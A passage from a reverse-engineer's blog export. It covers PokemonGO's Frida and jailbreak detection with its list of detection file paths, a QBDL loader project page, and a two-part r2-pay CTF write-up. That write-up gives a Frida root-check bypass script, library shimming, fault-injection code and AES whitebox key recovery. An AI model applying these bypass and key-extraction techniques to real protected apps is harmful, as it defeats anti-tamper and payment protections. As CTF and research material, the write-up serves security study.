\u0026#34;UNSET\u0026#34; #2 = 0 } { #1 = \u0026#34;BOT\u0026#34; #2 = 1 } { #1 = \u0026#34;SPOOFER\u0026#34; #2 = 2 } } #5 = 8 #8 = [] } Final Words The application embeds other checks in the constructors and in the functions returned by GetN2Api. It can make a good exercise for those that are interested in.\nGenerally speaking, the application and the protections are well designed since they slow down reverse engineers. Nevertheless, anti-{jb, frida, debug} are quite difficult to protect as they need to interact with the OS through functions or syscalls with unprotected parameters. As a result, and once identified, we can bypass them.\nOne technique consists in injecting a library with Frida\u0026rsquo;s injector that aims at hooking the containsAddress() to disable/patch the functions involved in the detections:\nNevertheless, this technique is not persistent and version-dependant.\nAfter writing this post, it turned out that its structure is very close to Reverse Engineering Starling Bank. In particular, we can find the same anti-debug and the same Frida detection routine. These similarities suggest that these two application uses the same obfuscator that also provides anti-{jb, frida, debug} as built-in.\nYou might also be interested in the recent talk of Eloi Benoist-Vanderbeken @Pass the Salt who detailed another approach to identify and bypass jailbreak detections.\nLIEF is a tool developed at Quarkslab along with QBDI \u0026amp; Triton. Annexes Files that trigger the JB detection Files that should be present /.bootstrapped_electra /cores /Applications/Anemone.app /dev/null /Applications/Cydia.app /etc/hosts /Applications/SafeMode.app /etc/passwd /Library/Frameworks/CydiaSubstrate.framework /sbin /Library/MobileSubstrate/DynamicLibraries/FlyJB.dylb /sbin/launchd /Library/MobileSubstrate/MobileSubstrate.dylib /sbin/mount /Library/PreferenceBundles/LaunchInSafeMode.bundle /usr /Library/PreferenceLoader/Preferences/LaunchInSafeMode.plist /Library/Themes /Library/dpkg/info/com.inoahdev.launchinsafemode.list /Library/dpkg/info/com.inoahdev.launchinsafemode.md5sums /bin/bash /bin/bunzip2 /bin/bzip2 /bin/cat /bin/chgrp /bin/chmod /bin/chown /bin/cp /bin/grep /bin/gzip /bin/kill /bin/ln /bin/ls /bin/mkdir /bin/mv /bin/sed /bin/sh /bin/su /bin/tar /binpack /bootstrap /chimera /electra /etc/apt /etc/profile /jb /private/var/binpack /private/var/checkra1n.dmg /private/var/lib/apt /usr/bin/diff /usr/bin/hostinfo /usr/bin/killall /usr/bin/passwd /usr/bin/recache /usr/bin/tar /usr/bin/which /usr/bin/xargs /usr/lib/SBInject /usr/lib/SBInject.dylib /usr/lib/TweakInject /usr/lib/TweakInject.dylib /usr/lib/TweakInjectMapsCheck.dylib /usr/lib/libjailbreak.dylib /usr/lib/libsubstitute.0.dylib /usr/lib/libsubstitute.dylib /usr/lib/libsubstrate.dylib /usr/libexec/sftp-server /usr/sbin/sshd /usr/share/terminfo /var/mobile/Library/.sbinjectSafeMode /var/mobile/Library/Preferences/jp.akusio.kernbypass.plist iPhone 6 running on iOS 14.2 with checkra1n.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWe can identify them by trial and error.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nETA: likely by the end of the year\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe Mach-O format is very suitable for this feature as the header in mapped in memory. Therefore, it eases the parsing.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMore generally, it can encode local data (strings, bytes arrays, \u0026hellip;)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nProtobuf strings can be identified as they usually start with 0xA, 0xB, followed by their lengths and the string itself (see: protocol-buffers/docs/encoding)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1626566400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"5a603667ac0a847f9c12e6a764ffbd36","permalink":"https://www.romainthomas.fr/post/21-07-pokemongo-anti-frida-jailbreak-bypass/","publishdate":"2021-07-18T00:00:00Z","relpermalink":"/post/21-07-pokemongo-anti-frida-jailbreak-bypass/","section":"post","summary":"This blog post analyzes the Frida and Jailbreak detection in PokemonGO for iOS.","tags":["iOS","reverse engineering","obfuscation"],"title":"Gotta Catch 'Em All: Frida \u0026 jailbreak detection","type":"post"},{"authors":["Adrien Guinet","Romain Thomas"],"categories":null,"content":"QBDL (QuarkslaB Dynamic Loader) is a cross-platform library that enables to load ELF, PE and Mach-O binaries with an abstraction on the targeted system. It abstracts the memory model on which the binary is loaded and provides an enhanced API to the user to process symbols resolution. In a nutshell, it enables to load binaries on foreign systems without reinventing the wheel.\nHere is an example to load a Mach-O in Triton with QBDL:\nclass TritonVM(pyqbdl.TargetMemory): def __init__(self, ctx: TritonContext): super().__init__() self.ctx = ctx def mmap(self, ptr, size): return ptr def mprotect(self, ptr, size, access): return True def write(self, ptr, data): self.ctx.setConcreteMemoryAreaValue(ptr, bytes(data)) def read(self, ptr, size): return self.ctx.getConcreteMemoryAreaValue(ptr, size) class TritonSystem(pyqbdl.TargetSystem): def __init__(self, arch, ctx): super().__init__(TritonVM(ctx)) self.arch = arch self.ctx = ctx def symlink(self, loader, sym): for name, impl, addr in externalFunctions: if sym.name == name: return addr return 0 def supports(self, bin_): return pyqbdl.Arch.from_bin(bin_) == self.arch def base_address_hint(self, bin_ba, vsize): return bin_ba x86_64_arch = pyqbdl.Arch(lief.ARCHITECTURES.X86, lief.ENDIANNESS.LITTLE, True) loader = pyqbdl.loaders.MachO.from_file(args.filename, x86_64_arch, TritonSystem(x86_64_arch, ctx), pyqbdl.Loader.BIND.NOW) ","date":1622678400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1650903950,"objectID":"56cca5f733ce0497aa03618871afae50","permalink":"https://www.romainthomas.fr/project/qbdl/","publishdate":"2021-06-03T00:00:00Z","relpermalink":"/project/qbdl/","section":"project","summary":"QuarkslaB Dynamic Loader: Generic loader for ELF, PE and Mach-O","tags":["lief","loader"],"title":"QBDL","type":"project"},{"authors":["Adrien Guinet","Romain Thomas"],"categories":null,"content":" Slides Talk (In French) ","date":1622678400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"1434f07c2f56abf03dc60cddf3203049","permalink":"https://www.romainthomas.fr/publication/21-sstic-qbdl/","publishdate":"2021-06-03T00:00:00Z","relpermalink":"/publication/21-sstic-qbdl/","section":"publication","summary":"The QuarkslaB Dynamic Loader (QBDL) library aims at providing a modular and portable way to dynamically load and link binaries","tags":null,"title":"QBDL: QuarkslaB Dynamic Loader","type":"publication"},{"authors":["Romain Thomas"],"categories":null,"content":" Slides Whitepaper Talk Demo #1: Snapchat Demo #2: Legu Packer Note: The videos are intentionally quick. Do not hesite to pause them.\n","date":1601510400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"be538b60cdac768ef1a4eb66140bfc9a","permalink":"https://www.romainthomas.fr/publication/20-bh-asia-dbi/","publishdate":"2020-10-01T00:00:00Z","relpermalink":"/publication/20-bh-asia-dbi/","section":"publication","summary":"Android applications are becoming more and more obfuscated to prevent reverse engineering. While obfuscation can be applied on both, the Dalvik bytecode and the native code, the former is more challenging to analyze due to the structure of the bytecode as well as the API provided by Android Runtime. The purpose of this talk is to present dynamic binary instrumentation techniques that can help reverse engineers to deal with obfuscated codes. These techniques aim to be obfuscator resilient so that it does not rely on a special kind of obfuscation neither a specific obfuscator.","tags":null,"title":"Dynamic Binary Instrumentation Techniques to Address Native Code Obfuscation","type":"publication"},{"authors":["Romain Thomas"],"categories":["Android","Reverse Engineering"],"content":" Introduction In the first part of this write-up, we described the anti-frida, anti-debug and anti-root techniques used in the application and how to remove most of them.\nThis second part digs into the JNI function gXftm3iswpkVgBNDUp and the underlying whitebox implementation.\nLibrary Shimming The inputs of the function gXftm3iswpkVgBNDUp are provided by the GUI widgets and the function is triggered when we press the Generate R2Coin button. Nevertheless, the behavior of gXftm3iswpkVgBNDUp does not rely on UI features nor the application\u0026rsquo;s context1.\nTo take a closer look at the logic of gXftm3iswpkVgBNDUp, it would be pretty useful to be able to feed the function\u0026rsquo;s inputs with our own standalone binary. Basically, we would like to achieve this kind of interface:\nint main(int argc, char** argv) { void* dlopen(\u0026#34;libnative-lib.so\u0026#34;, RTLD_NOW); ... jbyteArray out = gXftm3iswpkVgBNDUp(env, ...); return 0; } This technique is not new and has been already described in a blog post by Caleb Fenton2. The idea is to get the JNIEnv* env variable with JNI_CreateJavaVM which is exported by the Android runtime: libart.so.\nOnce we have this variable, we can call the gXftm3iswpkVgBNDUp function as well as manipulating the JNI buffers:\nenv-\u0026gt;NewByteArray() env-\u0026gt;GetArrayLength() \u0026hellip; Long story short, we can instantiate the Android runtime with the following piece of code:\nint main(int argc, char** argv) { JavaVMOption opt[2]; opt[0].optionString = \u0026#34;-Djava.class.path=/data/local/tmp/re.pwnme.1.0.apk\u0026#34;; opt[1].optionString = \u0026#34;-Djava.library.path=/data/local/tmp\u0026#34;; JavaVMInitArgs args; args.version = JNI_VERSION_1_6; args.options = opt; args.nOptions = 2; args.ignoreUnrecognized = JNI_FALSE; void* handler = dlopen(\u0026#34;/system/lib64/libart.so\u0026#34;, RTLD_NOW); auto JNI_CreateJavaVM_f = reinterpret_cast\u0026lt;decltype(JNI_CreateJavaVM)*\u0026gt;(dlsym(handler, \u0026#34;JNI_CreateJavaVM\u0026#34;)); JNI_CreateJavaVM_f(\u0026amp;jvm, \u0026amp;env, \u0026amp;args); } Then, we can resolve the gXftm3iswpkVgBNDUp function with the base address of libnative-lib.so and its offset 0x9B41C:\nvoid* hdl = dlopen(\u0026#34;libnative-lib.so\u0026#34;, RTLD_NOW); uintptr_t base_address = get_base_address(\u0026#34;libnative-lib.so\u0026#34;); using gXftm3iswpkVgBNDUp_t = jbyteArray(*)(JNIEnv*, jobject, jbyteArray, jbyte); gXftm3iswpkVgBNDUp = reinterpret_cast\u0026lt;gXftm3iswpkVgBNDUp_t\u0026gt;(base_address + 0x9B41C); Finally, we can run the function with our own inputs:\nstd::string pin_amount = \u0026#34;0000123400004567\u0026#34;; jbyteArray array = convert_to_jbyteArray(pin_amount, ptr); jbyteArray jencrypted_buffer = gXftm3iswpkVgBNDUp(env, nullptr, array, 0xF0); const std::vector\u0026lt;uint8_t\u0026gt; encrypted_buffer = from_jbytes(jencrypted_buffer); std::string hex_str = to_hex(encrypted_buffer); LOG_INFO(\u0026#34;{} --\u0026gt; {}\u0026#34;, pin_amount, ref_str); The whole implementation is available here . Function Tracing Now that we are able to run the gXftm3iswpkVgBNDUp function without the GUI layer, we can easily create an interface with QBDI:\nVM vm; vm.addInstrumentedModule(\u0026#34;libnative-lib.so\u0026#34;); ... jbyteArray array = to_jarray(pin_amount, ptr); jbyteArray qbdi_encrypted_buffer; vm.call( /* ret */ reinterpret_cast\u0026lt;uintptr_t*\u0026gt;(\u0026amp;qbdi_encrypted_buffer), /* target */ reinterpret_cast\u0026lt;uintptr_t\u0026gt;(gXftm3iswpkVgBNDUp), /* params */ { /* p_0: JNIEnv* */ reinterpret_cast\u0026lt;rword\u0026gt;(env), /* p_1: jobject thiz */ reinterpret_cast\u0026lt;rword\u0026gt;(nullptr), /* p_2: inbuffer */ reinterpret_cast\u0026lt;rword\u0026gt;(array), 0xF0 } ); The execution in QBDI without user\u0026rsquo;s callbacks takes about 3min 30s which is quite huge compared to the real execution that takes about 853ms:\nThis overhead is mostly due to the function 0x1038f0 that is executed ~20 000 times. After a quick analysis, it turns out that this function is not relevant to instrument to break the whitebox. We can force its real execution (i.e. outside QBDI) by removing the function\u0026rsquo;s address from the instrumented range3.\nstatic constexpr uintptr_t HEAVY_FUNCTION = 0x1038f0; vm.removeInstrumentedRange( base_address + HEAVY_FUNCTION, base_address + HEAVY_FUNCTION + 1 ); This small adjustment drops the execution to 3'30sec.\nSome cryptographic algorithms can be fingerprinted either with predefined constants or with their memory accesses. According to the Quarkslab\u0026rsquo;s blog post: Differential Fault Analysis on White-box AES Implementations, the whitebox lookup tables are likely to be stored in the .data, .rodata, ... sections.\nBy looking at the sizes of these sections, only the .data section seems to have an appropriate size. We can generate a memory trace on this section to see if we can outline some patterns. It can be made with the following piece of code:\nvm.recordMemoryAccess(MEMORY_READ_WRITE); vm.addMemRangeCB( /* .data start address */ base_address + 0x127000, /* .data end address */ base_address + 0x127000 + 0x8e000, /* Record both: reads and writes */ MEMORY_READ_WRITE, /* Memory callback */ [] (VM* vm, GPRState*, FPRState*, void* data) { auto ctx = reinterpret_cast\u0026lt;qbdi_ctx*\u0026gt;(data); /* * \u0026#39;for\u0026#39; loop since on AArch64 we can have multiple reads / writes * at once. (e.g. stp x0, x1, [sp, #128]) */ for (const MemoryAccess\u0026amp; mem_access : vm-\u0026gt;getInstMemoryAccess()) { ctx-\u0026gt;trace-\u0026gt;push_back({ mem_access.instAddress - base_address, mem_access.accessAddress - base_address, mem_access.size, }); } return VMAction::CONTINUE; }, \u0026amp;ctx); Generating the memory trace takes about 11sec which is acceptable. It leads to the following graph in which we can notice a characteristic pattern at the end of the trace:\nFault Injection The pattern at the end of the trace is quite characteristic of AES-128 where we can identify 10 rounds. We now have all the necessary information to make a fault injection attack:\nWe can identify the 9th round We can accurately fault the .data section thanks to the memory trace The memory trace is available in the mem_trace.json file of the repository. To efficiently make the injection, we can first reduce the memory addresses to only keep those that are used in the last 2 rounds:\ntrace_file = CWD / \u0026#34;..\u0026#34; / \u0026#34;assets\u0026#34; / \u0026#34;mem_trace.json\u0026#34; trace = json.loads(trace_file.read_bytes())[0] # Keep the entries that are involved in the last 2-rounds (empirical number) nice_trace = trace[-1000:] Then, we can use our shim mechanism to inject the faults in the .data section with the addresses previously selected. Moreover, we can reduce the set of .data addresses with the faults that introduce exactly 4 differences in the ciphertext:\n// Make sure the .data section is writable mprotect( reinterpret_cast\u0026lt;void*\u0026gt;(base_address + /* .data */ 0x127000), 0x8e000, PROT_READ | PROT_WRITE ); for (uintptr_t fault_addr : selected_addresses) { uint8_t\u0026amp; target_byte = *reinterpret_cast\u0026lt;uint8_t*\u0026gt;(base_address + fault_addr); uint8_t backup = target_byte; // Fault 1 byte: target_byte ^= 0x33; // Run the whitebox with the faulty byte const std::vector\u0026lt;uint8_t\u0026gt; encrypted = encrypt(msg); // Restore the original byte target_byte = backup; // Compute the number of errors // ... } Finally, with the subset of the addresses that affect exactly 4 bytes, we can generate several faults for a given address:\nfor (uintptr_t nice_fault_addr : four_bytes_fault_addresses) { for (size_t i = 0; i \u0026lt; 255; ++i) { const std::vector\u0026lt;uint8_t\u0026gt;\u0026amp; output = inject_fault(addr, PIN_AMOUNT, i); const size_t nb_errors = get_error(genuine_value, output); if (nb_errors == 4 and unique.insert(output).second) { // Record the entry ... } } } The aforementioned code gives an idea about how to generate the faults. One can find the whole implementation in this file: shim-whitebox/src/main.cpp that produces this set of files assets/wb-traces.\nKey Extraction Thanks to the Side-Channel Marvels project, we can use JeanGrey \u0026mdash; developed by Philippe Teuwen \u0026mdash; to recover the whitebox\u0026rsquo;s key from the faulty traces:\nimport pathlib import phoenixAES CWD = pathlib.Path(__file__).parent trace_dir = CWD / \u0026#34;..\u0026#34; / \u0026#34;assets\u0026#34; / \u0026#34;wb-traces\u0026#34; for f in trace_dir.iterdir(): x = phoenixAES.crack_file(f) if x is not None: print(x, f.name) It provides the following results which enable to retrieve the key:\n$ python wb_key_recovery.py ..8D....7F............9A....79.. injection-1a930d.trace ..8D....7F............9A....79.. injection-1a95bd.trace ....19....62....B0............8F injection-1a91b2.trace ....19....62....B0............8F injection-1a8fdf.trace 76............1E....D3....E1.... injection-1a8549.trace ......E1....A0....CD....28...... injection-1a8978.trace ....19....62....B0............8F injection-1a90ce.trace ....19....62....B0............8F injection-1a8efd.trace r 2 p 4 y 1 s N 0 w S e c u r 3 Finally, we can verify that r2p4y1sN0wSecur3 is the right key by trying to decrypt 9497cdf1df2600e7f63778d0ae91dcbb4:\nfrom Crypto.Cipher import AES WB_KEY = b\u0026#34;r2p4y1sN0wSecur3\u0026#34; cipher = AES.new(WB_KEY, AES.MODE_ECB) output = cipher.decrypt(bytes.fromhex(\u0026#34;9497cdf1df2600e7f63778d0ae91dcbb\u0026#34;)) print(output.decode()) $ python ./aes_test.py 0000123400004567 Side note about the .data section Most of the obfuscators encode strings so that we don\u0026rsquo;t have any clue about functions\u0026rsquo; logic. The obfuscator used in the challenge follows this rule and running the strings utility on the library does not reveal any interesting information.\nNevertheless, we can find a lot of .datadiv_decode\u0026lt;random hex\u0026gt; in the ELF constructors of the library. As explained in the previous part, they are generated by the obfuscator and aimed to decode the strings.\nSince these functions are in the ELF constructors, this means that they are executed as soon as the library is loaded. In particular, when calling dlopen(...) these constructors are executed. It can be confirmed by dumping the .data section right after dlopen():\ndlopen(\u0026#34;libnative-lib.so\u0026#34;, RTLD_NOW); std::ofstream ofs{fmt::format(\u0026#34;/data/local/tmp/{}\u0026#34;, output)}; auto start = reinterpret_cast\u0026lt;const char*\u0026gt;(base_address + 0x127000); ofs.write(start, /* sizeof(.data) */ 0x8d49f); Then, we can compare the bytes distribution with binvis.io:\nAt the end of the in-memory .data section, we can found interesting strings used to detect Frida and the device\u0026rsquo;s root state.\nConclusion Thanks again to Eduardo Novella (@enovella_) and Gautam Arvind (@darvincisec) for this second part of the challenge :)\nAlso thanks to Quarkslab that allowed this publication. One can find related blog posts about whitebox attacks on the Quarkslab\u0026rsquo;s blog:\nIntroduction to Whiteboxes and Collision-Based Attacks With QBDI by Paul Hernault (@0xAcid)\nWhen SideChannelMarvels meet LIEF Differential Fault Analysis on White-box AES Implementations by Philippe Teuwen (@doegox). I used this blog post as a reference to resolve this part of the challenge.\nReferences https://developer.android.com/reference/android/content/Context\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nQBDI will execute the function using the ExecBroker mechanism.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nIt is the output of the function when entering 1234 in the PIN field and 4567 in the amount field.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1601164800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"22a0d53d8bd74d4cfb25cc6fcaf6938b","permalink":"https://www.romainthomas.fr/post/20-09-r2con-obfuscated-whitebox-part2/","publishdate":"2020-09-27T00:00:00Z","relpermalink":"/post/20-09-r2con-obfuscated-whitebox-part2/","section":"post","summary":"This second blog post explains how to recover the whitebox's key from the obfuscated library libnative-lib.so","tags":["android","reverse engineering","write-up","obfuscation","whitebox","cryptography"],"title":"r2-pay: whitebox (part 2)","type":"post"},{"authors":["Romain Thomas"],"categories":["Android","Reverse Engineering"],"content":" Introduction This series of blog posts explains one way to resolve the r2-pay challenge released during the r2con2020 conference. This first part is about the anti-analysis tricks used to hinder reverse-engineering while the second part will be more focused on breaking the whitebox.\nThe resolution took me more than a week-end but it covers nice topics that worth it: obfuscation \u0026amp; whitebox. It was also the opportunity to practice attacks against whiteboxes and to test SideChannelMarvels/JeanGrey developed by Philippe Teuwen (aka. @doegox).\nThe challenge has been resolved with the AArch64 version on a device running on Android 9 and rooted with Magisk.\nNote Here are the files used in this write-up:\nre.pwnme.1.0.apk - af019d3016720592aade7bde9890110c\nlibnative-lib.so (arm64-v8a version)\nOverview When opening the application on a non-tempered device (or with Magisk hide enabled), we are asked to enter a PIN and an amount that is used to generate a token.\nTo resolve the challenge, we have to find the master key that is used to generate the token. Few days before the CTF I was told that one of the challenges would involve an obfuscated whitebox\u0026hellip;\nThe main interface of the APK is located in the Java class re.pwnme.MainActivity which forwards the user inputs (PIN \u0026amp; amount) to a JNI function named gXftm3iswpkVgBNDUp. This function takes the concatenated input $PIN\\ ||\\ Amount$ and returns the token as a byte array.\nThe static constructor of the class loads the \u0026ldquo;native-lib\u0026rdquo; library which is available for the architectures: arm64-v8a, armeabi-v7a, and x86_64. Unsurprisingly, this library is obfuscated and some symbols suggest that it has been compiled with a fork of O-LLVM 1.\nIn addition, the library does not export the expected symbol Java_re_pwnme_MainActivity_gXftm3iswpkVgBNDUp but prefers to use the JNI_OnLoad technique 2. JNI_OnLoad() is also obfuscated along with control-flow-flattening.\nThe main task of the challenge is to understand the logic of the gXftm3iswpkVgBNDUp function to figure out how the token is generated.\nAnti-Root \u0026amp; Anti-Frida Along with the libnative-lib.so library, the applications embeds another library libtool-checker.so whose name sounds quite familiar: it comes from the open-source project rootbeer which is used to detect if the device is rooted.\nSome of the root-checks are done in the MainActivity class and if the device is rooted the application raises an exception by dividing a number with 0.\nOn this point, we can disable the check by using Frida on the rootbeer\u0026rsquo;s functions involved in the detection:\n// frida -U -l ./bypass-root.js --no-pause -f re.pwnme Java.perform(function () { var RootCheck = Java.use(\u0026#39;\\u266b.\\u1d64\u0026#39;); RootCheck[\u0026#39;₤\u0026#39;].implementation = function () { console.log(\u0026#34;Skip root\u0026#34;); return false; } RootCheck[\u0026#39;θ\u0026#39;].overload().implementation = function () { console.log(\u0026#34;Skip root\u0026#34;); return false; } }) Nevertheless, the application still crashes as soon as it starts and generates the following backtrace:\nF libc : Fatal signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xfa929095 in tid 8875 (re.pwnme), pid 8849 (re.pwnme) F DEBUG : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** F DEBUG : Build fingerprint: \u0026#39;google/taimen/taimen:9/PQ3A.190801.002/5670241:user/release-keys\u0026#39; F DEBUG : Revision: \u0026#39;rev_10\u0026#39; F DEBUG : ABI: \u0026#39;arm64\u0026#39; F DEBUG : pid: 8849, tid: 8875, name: re.pwnme \u0026gt;\u0026gt;\u0026gt; com.google.android.gms \u0026lt;\u0026lt;\u0026lt; F DEBUG : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xfa929095 F DEBUG : x0 0000007f041f6610 x1 0000007f2565c800 x2 0000007f25600000 x3 000000000000001d F DEBUG : x4 000000000000005c x5 0000000000000001 x6 0000000000000001 x7 0000000000000000 F DEBUG : x8 0000007f041f6610 x9 0000007f041f6600 x10 00000000fa929095 x11 00000000000035b2 F DEBUG : x12 00000000e34d79ac x13 00000000fffffff7 x14 00000000a139577d x15 0000000000000001 F DEBUG : x16 0000007fa66af220 x17 0000007fa65e3608 x18 0000000000000000 x19 0000007f041f6680 F DEBUG : x20 0000000000000000 x21 0000000000000000 x22 0000229100002291 x23 0000000000000000 F DEBUG : x24 0000007f041ff570 x25 0000007f04102000 x26 0000007fab1ad5e0 x27 0000007f0421a690 F DEBUG : x28 0000007f04209080 x29 0000007f041ff490 F DEBUG : sp 0000007f041f65f0 lr 0000007f0423de04 pc 0000007f0423f980 F DEBUG : F DEBUG : backtrace: F DEBUG : #00 pc 000000000003f980 /data/app/re.pwnme-7O3ynhSmMsg2_E5_uqbQxQ==/lib/arm64/libnative-lib.so The backtrace suggests that other checks are performed in the native library. By looking at the ELF\u0026rsquo;s constructors, we can notice two functions that differ from those generated by the obfuscator:\n.datadiv_decode13003153710004289592 functions are in the ELF constructors since they decode global strings that need to be available as soon as the library is loaded. By tracing these functions with QBDI, we quickly understand that sub_9080 iterates over /proc/self/maps with the syscalls openat/read that are located at the addresses 0x009870 and 0x00b448.\nThen, we observe the following sequence:\n0x011fb0: syscall: openat(0xffffffffffffff9c, \u0026#39;/system/lib64/libc.so\u0026#39;) 0x012884: syscall: read(51, 0x7ffc006c58, 64): \u0026#39;ELF@)@8@\u0026#39; 0x013170: syscall: lseek(51, 0x112918, 0) 0x0145f8: syscall: read(51, 0x7ffc006c18, 64) 0x0145f8: syscall: read(51, 0x7ffc006c18, 64) 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;/ \u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;B88\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;J\u0026gt;\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;RoP)\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;\\o((\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;io\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;xo0\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64) 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;Bxx`-\u0026#39; 0x0145f8: syscall: read(51, 0x7ffc006c18, 64): \u0026#39;PP`\u0026#39; 0x0151f4: malloc(0x18): 0x7f0c21f4c0 0x0156e4: syscall: lseek(51, 0x1a650, 0) 0x015a68: malloc(0x1e60): 0x7f0acb2000 0x015fa0: syscall: read(51, 0x7f0acb2000, 0x1e60): \u0026#39;{n@b r@ v@ z@ ~@ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ A A\u0026#34; AB Ab A A A A \u0026#34;A \u0026amp;A\u0026#34; *AB .Ab 2A 6A :A \u0026gt;A BA FA\u0026#34; JAB NAb RA VA ZA ^A bA fA\u0026#34; jAB nAb rA vA zA ~A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A B B\u0026#34; BB Bb B B B B \u0026#34;B \u0026amp;B\u0026#34; *BB .Bb 2B 6B :B \u0026gt;B BB FB\u0026#34; JBB NBb RB VB ZB ^B bB fB\u0026#34; jBB nBb rB vB zB ~B B B\u0026#34; BB Bb B B B B B B\u0026#34; B ...\u0026#39; 0x016cfc: free(0x7f0acb2000) -\u0026gt; {n@b r@ v@ z@ ~@ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ @ @\u0026#34; @B @b @ @ @ @ A A\u0026#34; AB Ab A A A A \u0026#34;A \u0026amp;A\u0026#34; *AB .Ab 2A 6A :A \u0026gt;A BA FA\u0026#34; JAB NAb RA VA ZA ^A bA fA\u0026#34; jAB nAb rA vA zA ~A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A A A\u0026#34; AB Ab A A A A B B\u0026#34; BB Bb B B B B \u0026#34;B \u0026amp;B\u0026#34; *BB .Bb 2B 6B :B \u0026gt;B BB FB\u0026#34; JBB NBb RB VB ZB ^B bB fB\u0026#34; jBB nBb rB vB zB ~B B B\u0026#34; BB Bb B B B B B B\u0026#34; B ... 0x017118: syscall: close(51) From this output, we can infer the following logic:\n0x011fb0: the function opens the libc 0x012884: it reads the ELF header 0x013170: it jumps to the ELF sections table 0x0145f8: it looks for the .plt section 0x015a68, 0x015fa0: it reads the content of the .plt section These operations suggest that the function checks if the .plt of /system/lib64/libc.so is not tampered with. In particular, if we use Frida on a libc\u0026rsquo;s function this check won\u0026rsquo;t pass.\nAfter this check, the function sub_9080 spawns a thread:\n0x0195dc: pthread_create(0xf1079f10, 0x0, 0x1a690, 0x0) The libc integrity check makes more sense as it is probably used to protect the library against a hook of pthread_create().\nThe thread\u0026rsquo;s routine sub_1a690 starts by making two calls to the mathematical function tan():\n0x01b774: tan(0.): 0. 0x01b79c: tan(-7832.0): -0.00951489 0x01cc74: memcpy(0x7ffc006598, libnative-lib.so!0x1267f0, 80) -\u0026gt; !7Nl 0x01ceb8: rand() 0x01f774: tan(0.): 0. 0x01f79c: tan(-7832.0): -0.00951489 My understanding of these calls is that the application tries to protect against tools that would not support floating-point instructions such as FCMP or FMOV. In addition, I think that if we mock the behavior of tan() with a constant value it would trigger a crash.\nThen it follows a check of TracerPid value in /proc/self/status. This value is set when the process is ptrace-debugged (which is the case with gdb). Dynamically, we observe syscalls that open /proc/self/status and read the content byte-per-byte:\n0x020ee0: syscall: openat(0xffffffffffffff9c, \u0026#39;/proc/self/status\u0026#39;): 51 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;N\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;a\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;m\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;e\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;:\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1) 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;r\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;e\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;.\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;p\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;w\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;n\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;m\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;e\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1) 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;S\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;t\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;a\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;t\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;e\u0026#39; 0x0231e8: syscall: read(51, 0x7ffc00656c, 1): \u0026#39;:\u0026#39; ... Anti-Frida #1 Still in the thread\u0026rsquo;s routine sub_1a690, the function checks if Frida is running by looking at all the values of /proc/self/task/\u0026lt;tid\u0026gt;/status and by checking if one of the names is gmain. It turns out that 